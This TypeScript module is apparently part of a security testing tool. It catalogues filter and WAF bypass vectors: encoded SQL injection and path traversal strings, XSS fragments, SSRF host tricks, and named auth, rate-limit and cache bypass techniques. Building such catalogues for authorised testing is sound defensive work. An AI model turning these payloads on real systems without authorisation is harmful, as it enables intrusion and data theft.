/**
 * Reference payload catalogue for filter/WAF bypass layers. Checks import the
 * vectors they can validate; layers without a generic oracle stay documented
 * for manual testing. Nothing in this module sends a request by itself.
 */
export const bypassCatalogue = {
  encoding: {
    urlSingle: ["%2e%2e%2f", "%27%20OR%201%3D1"],
    urlDouble: ["%252e%252e%252f", "%2527%2520OR%25201%253D1"],
    unicode: ["%c0%af", "%uff0e", "%u2215", "％2e"],
    htmlEntity: ["&#97;lert(1)", "&#x6a;avascript:"],
    hex: ["0x31", "\\x27"],
    base64: ["aWQ=", "PHNjcmlwdD4="],
    utf16: ["%u003cscript%u003e", "\\u0061lert"],
  },
  caseSpace: ["SeLeCt", "%09", "%0a", "/**/", "+", "%20", "$IFS"],
  keyword: ["/*!50000*/", "CONCAT('se','lect')", "CHAR(115,101,108,101,99,116)", "sel/**/ect"],
  path: ["..;/", "%2e%2e/", "....//", "%252e", "..\\", "%c0%af", "%uff0e", "/."],
  hostUrl: ["@", "\\", "#", "?", ";", ":port", "userinfo", "[::1]", "2130706433", "%00", "trailing."],
  header: ["X-Forwarded-For chain", "X-Original-URL", "X-Rewrite-URL", "X-HTTP-Method-Override"],
  contentType: ["JSON to form", "JSON to XML", "text/plain", "charset variant"],
  auth: ["drop header", "empty token", "Bearer null", "other-role token", "duplicate cookie"],
  rateLimit: ["rotate IP", "spoof header", "distributed", "slow", "change param case"],
  waf: ["origin IP", "HTTP/2", "chunked", "multipart", "odd boundary", "large body", "duplicate JSON key"],
  sanitizer: ["mXSS", "namespace", "srcdoc", "DOM clobbering", "SVG/MathML"],
  cache: ["cache buster", "unkeyed header", "path confusion", "method confusion"],
} as const;

export type BypassLayer = keyof typeof bypassCatalogue;
